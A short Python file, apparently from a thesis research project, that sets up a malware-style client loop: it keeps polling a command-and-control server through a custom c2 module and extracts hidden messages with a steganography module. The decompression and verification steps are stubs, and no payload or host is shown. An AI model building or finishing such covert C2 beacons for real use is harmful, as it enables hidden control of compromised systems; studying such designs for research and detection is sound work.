#I Arnoud Stolk am in no way responsible for how this project is used.
#This project has been created for research purpose.
#The purpose of sharing this sourcecode online is to support my thessis.
#For more information please use https://github.com/arnoudx6/bmga


#Import standard modules
import time

#Import custom modules
import c2
import stego

#Initialize script variables
waitingForC2 = True
timeBeforeNextC2Poll = 5

#Creating an endless loop that
firstLoopItteration = True
while waitingForC2:
    if not firstLoopItteration:
        print("Waiting {0} seconds before next C2 poll".format(timeBeforeNextC2Poll))
        time.sleep(timeBeforeNextC2Poll)
    else:
        firstLoopItteration = False

    #New loop itteration
    print("New loop itteration")

    #Check if there is a new C&C message
    print("Contacting C2")
    c2Response = c2.get()
    if not c2Response: #<-- If there is no message from the C&C
        continue

    #Extract the embedded text from the stego text response
    success, embeddedText = stego.extractEmbeddedTextFromStegoText("aa", "bb")
    if (not embeddedText) or (not success):
        continue

    #Decompress the embedded text

    #Check the embedded text hash

